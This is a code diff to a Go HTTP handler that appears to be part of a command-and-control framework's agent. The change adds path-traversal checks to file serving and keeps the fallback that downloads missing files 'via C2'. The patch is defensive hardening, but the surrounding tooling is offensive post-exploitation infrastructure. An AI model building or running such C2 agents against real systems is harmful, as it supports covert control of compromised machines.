@@ -10,6 +10,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
@@ -231,11 +232,21 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	target_path := file_path
+	var target_path string
 
-	// 1. Check if the file exists in memfs or on disk
-	if !util.IsFileExist(file_path) {
-		// Prevent path traversal for disk fallback paths
+	if strings.HasPrefix(file_path, "mem://") {
+		// Memory filesystem path
+		if !util.IsFileExist(file_path) {
+			http.Error(w, "File not found", http.StatusNotFound)
+			return
+		}
+		target_path = file_path
+	} else {
+		// Disk file path: enforce strict basename/locality to prevent traversal
+		if filepath.IsAbs(file_path) || strings.Contains(file_path, "..") {
+			http.Error(w, "Invalid file path", http.StatusBadRequest)
+			return
+		}
 		basename := util.FileBaseName(file_path)
 		if basename == "" {
 			http.Error(w, "Invalid file path", http.StatusBadRequest)
@@ -244,20 +255,18 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 		safe_path := filepath.Join(os.TempDir(), basename)
 
 		if !util.IsFileExist(safe_path) {
-			logging.Infof("handleClient: file %s (%s) does not exist in memfs or disk, downloading from C2", safe_path, checksum)
+			logging.Infof("handleClient: file %s (%s) does not exist on disk, downloading from C2", safe_path, checksum)
 			_, err := DownloadViaC2(common.RuntimeConfig, file_path, safe_path, checksum)
 			if err != nil {
 				logging.Infof("handleClient: failed to download file from C2: %v", err)
 				http.Error(w, "Failed to download file from C2", http.StatusInternalServerError)
 				return
 			}
-			target_path = safe_path
-		} else {
-			target_path = safe_path
 		}
+		target_path = safe_path
 	}
 
-	// 2. Read file content using ReadFileAgent (handles memfs and encrypted storage)
+	// Read file content using ReadFileAgent (handles memfs and encrypted storage)
 	data, err := util.ReadFileAgent(target_path)
 	if err != nil {
 		logging.Infof("handleClient: failed to read file %s: %v", target_path, err)
@@ -265,7 +274,7 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 3. Serve file content
+	// Serve file content
 	http.ServeContent(w, r, util.FileBaseName(target_path), time.Now(), bytes.NewReader(data))
 }
 
